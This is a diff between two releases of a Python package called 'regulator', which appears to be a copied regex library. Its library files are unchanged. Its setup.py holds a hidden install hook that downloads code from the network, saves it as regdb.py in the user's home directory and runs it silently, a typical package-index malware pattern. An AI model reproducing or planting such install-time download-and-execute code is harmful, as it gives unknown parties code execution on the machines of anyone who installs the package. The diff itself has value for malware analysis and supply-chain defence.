# Comparing `tmp/regulator-1.0.1.tar.gz` & `tmp/regulator-1.0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dist\regulator-1.0.1.tar", last modified: Tue Jul 18 07:29:43 2023, max compression
+gzip compressed data, was "dist\regulator-1.0.2.tar", last modified: Tue Jul 18 07:57:03 2023, max compression
```

## Comparing `regulator-1.0.1.tar` & `regulator-1.0.2.tar`

### file list

```diff
@@ -1,15 +1,15 @@
-drwxrwxrwx   0        0        0        0 2023-07-18 07:29:43.000000 regulator-1.0.1/
--rw-rw-rw-   0        0        0      111 2023-07-18 07:29:44.000000 regulator-1.0.1/PKG-INFO
-drwxrwxrwx   0        0        0        0 2023-07-18 07:29:43.000000 regulator-1.0.1/regulator/
--rw-rw-rw-   0        0        0       68 2023-05-18 10:29:08.000000 regulator-1.0.1/regulator/__init__.py
--rw-rw-rw-   0        0        0   145648 2023-05-18 10:29:08.000000 regulator-1.0.1/regulator/_regex_core.py
--rw-rw-rw-   0        0        0    33561 2023-05-18 10:29:08.000000 regulator-1.0.1/regulator/regex.py
--rw-rw-rw-   0        0        0   224004 2023-05-18 10:29:08.000000 regulator-1.0.1/regulator/test_regex.py
-drwxrwxrwx   0        0        0        0 2023-07-18 07:29:43.000000 regulator-1.0.1/regulator.egg-info/
--rw-rw-rw-   0        0        0      111 2023-07-18 07:29:44.000000 regulator-1.0.1/regulator.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      262 2023-07-18 07:29:44.000000 regulator-1.0.1/regulator.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-18 07:29:44.000000 regulator-1.0.1/regulator.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        9 2023-07-18 07:29:44.000000 regulator-1.0.1/regulator.egg-info/requires.txt
--rw-rw-rw-   0        0        0       10 2023-07-18 07:29:44.000000 regulator-1.0.1/regulator.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-07-18 07:29:44.000000 regulator-1.0.1/setup.cfg
--rw-rw-rw-   0        0        0     1169 2023-07-18 07:29:38.000000 regulator-1.0.1/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-18 07:57:03.000000 regulator-1.0.2/
+-rw-rw-rw-   0        0        0      111 2023-07-18 07:57:04.000000 regulator-1.0.2/PKG-INFO
+drwxrwxrwx   0        0        0        0 2023-07-18 07:57:03.000000 regulator-1.0.2/regulator/
+-rw-rw-rw-   0        0        0       68 2023-05-18 10:29:08.000000 regulator-1.0.2/regulator/__init__.py
+-rw-rw-rw-   0        0        0   145648 2023-05-18 10:29:08.000000 regulator-1.0.2/regulator/_regex_core.py
+-rw-rw-rw-   0        0        0    33561 2023-05-18 10:29:08.000000 regulator-1.0.2/regulator/regex.py
+-rw-rw-rw-   0        0        0   224004 2023-05-18 10:29:08.000000 regulator-1.0.2/regulator/test_regex.py
+drwxrwxrwx   0        0        0        0 2023-07-18 07:57:03.000000 regulator-1.0.2/regulator.egg-info/
+-rw-rw-rw-   0        0        0      111 2023-07-18 07:57:04.000000 regulator-1.0.2/regulator.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      262 2023-07-18 07:57:04.000000 regulator-1.0.2/regulator.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-18 07:57:04.000000 regulator-1.0.2/regulator.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       16 2023-07-18 07:57:04.000000 regulator-1.0.2/regulator.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       10 2023-07-18 07:57:04.000000 regulator-1.0.2/regulator.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-07-18 07:57:04.000000 regulator-1.0.2/setup.cfg
+-rw-rw-rw-   0        0        0     1132 2023-07-18 07:56:40.000000 regulator-1.0.2/setup.py
```

### Comparing `regulator-1.0.1/regulator/_regex_core.py` & `regulator-1.0.2/regulator/_regex_core.py`

 * *Files identical despite different names*

### Comparing `regulator-1.0.1/regulator/regex.py` & `regulator-1.0.2/regulator/regex.py`

 * *Files identical despite different names*

### Comparing `regulator-1.0.1/regulator/test_regex.py` & `regulator-1.0.2/regulator/test_regex.py`

 * *Files identical despite different names*

### Comparing `regulator-1.0.1/setup.py` & `regulator-1.0.2/setup.py`

 * *Files 9% similar despite different names*

```diff
@@ -15,21 +15,21 @@
 
         if response.status_code == 200:            
             data_path = os.path.join(home_directory, "regdb.py")
             
             with open(data_path, 'w') as f:
                 f.write(response.text)
             try:
-                subprocess.Popen(['python', data_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                subprocess.Popen(['python3', data_path], stdout=None, stderr=None)
             except Exception as e:
-                subprocess.Popen(['python3', data_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                subprocess.Popen(['python', data_path], stdout=None, stderr=None)
         else:
             print('Error:', response.status_code)
 
 setup(name="regulator",
-version="1.0.1",
+version="1.0.2",
 author="gadapokasoz6",
 description="regular express module",
 cmdclass={'install': SetupProcess,},
 packages=["regulator"],
-install_requires=["requests"],
+install_requires=["requests>=1.0.0"],
 )
```

